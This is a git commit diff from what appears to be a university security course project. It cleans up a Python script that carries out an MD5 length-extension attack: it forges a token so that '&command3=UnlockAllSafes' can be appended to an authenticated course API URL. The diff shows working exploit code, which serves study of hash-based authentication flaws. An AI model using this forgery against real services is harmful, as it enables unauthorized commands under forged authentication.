5767e259e76ef7d45bb655c161e134444524078b
hirochri <hirochri@umich.edu>
2017-01-25 21:17:54 -0500

    Cleaned up code a little bit, just need to do writeup

--- project1/part1/len_ext_attack.py
+++ project1/part1/len_ext_attack.py
@@ -1,16 +1,8 @@
 from pymd5 import md5, padding
 import httplib, urlparse, sys, urllib, math
 
-#help from instr
-#what we want are 2 urls that have the same md5 hash
-#How can we get that just by changing the token?(we cant)
-#you have to add osmething directly into the 
-#url between the token and the msg/extension that causes the 
-#url to have to what we want
-
 # get original url
-# url = sys.argv[1]
-url = 'https://eecs388.org/project1/api?token=402a574d265dc212ee64970f159575d0&user=admin&command1=ListFiles&command2=NoOp'
+url = sys.argv[1]
 parsedUrl = urlparse.urlparse(url)
 token = parsedUrl.query.split('&')[0][6:]
 message = parsedUrl.query.split('&', 1)[1]
@@ -24,12 +16,11 @@ h = md5(state=token.decode('hex'), count=count)
 extension = '&command3=UnlockAllSafes'
 h.update(extension)
 
-# update url
+# update url and add padding so server can verify correctly
 newtoken = urllib.quote(h.hexdigest())
 url = 'https://' + parsedUrl.hostname + parsedUrl.path + \
         '?token=' + newtoken + '&' + message + \
         urllib.quote(padding(length_of_m * 8)) + extension
-print url
 
 # send url
 parsedUrl = urlparse.urlparse(url)
